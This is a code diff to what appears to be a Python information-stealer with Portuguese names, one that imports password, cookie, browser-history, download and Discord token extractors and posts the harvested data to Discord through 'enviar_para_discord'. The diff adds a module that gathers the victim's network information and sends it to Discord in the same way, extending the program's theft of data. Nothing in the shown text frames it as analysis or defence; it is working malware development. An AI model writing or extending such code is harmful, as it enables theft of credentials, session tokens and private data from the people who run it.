@@ -13,6 +13,7 @@ from plugins.downloads import BrowserDownloadsExtractor
 from plugins.history import BrowserDataExtractor
 from plugins.cookies import CookieExtractor
 from plugins.print import Sprint, save_image
+from plugins.network import obter_informacoes_internet
 from datetime import datetime
 from multiprocessing import freeze_support
 
@@ -38,6 +39,7 @@ executou_password_extractor = False
 executou_browser_downloads = False
 executou_browser_history = False
 executou_cookie_extractor = False
+executou_network_info = False
 
 def executar_comando(comando):
     try:
@@ -233,6 +235,17 @@ if __name__ == "__main__":
             'color': 0x00FF00
             }
             enviar_para_discord('', embed=sistema_embed)
+
+        if not executou_network_info and cfg.get("network_info", False):
+            network_info = obter_informacoes_internet()
+            executou_network_info = True
+            network_embed = {
+                'title': 'Informações de internet',
+                'description': f'```\n{network_info}\n```',
+                'color': 0x00FF00
+            }
+            enviar_para_discord('', embed=network_embed)
+
 
         if not executou_discord_info and cfg.get("discord_info", False) :
             discord_info = TokenExtractor()
